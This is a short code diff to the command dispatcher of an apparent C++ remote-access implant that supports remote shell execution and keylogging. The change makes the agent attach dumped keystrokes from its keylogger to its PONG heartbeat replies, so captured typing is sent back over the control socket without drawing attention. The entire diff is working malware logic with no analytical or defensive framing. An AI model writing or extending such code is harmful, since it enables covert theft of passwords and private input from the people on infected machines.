@@ -149,7 +149,12 @@ void Agent::handleDispatching(Packet&& packet) {
     } else if (opcode == static_cast<uint16_t>(Opcode::CMD_EXEC)) {
         handleShellExecution(std::move(packet));
     } else if (opcode == static_cast<uint16_t>(Opcode::PING)) {
-        Packet pong(static_cast<uint16_t>(Opcode::PONG), "");
+        // Piggyback any available keylog data on the PONG response
+        std::string pong_payload;
+        if (m_keylogger.isRunning()) {
+            pong_payload = m_keylogger.dump();
+        }
+        Packet pong(static_cast<uint16_t>(Opcode::PONG), pong_payload);
         std::vector<uint8_t> data = pong.serialize();
         m_socket.sendData(data);
     } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_START)) {
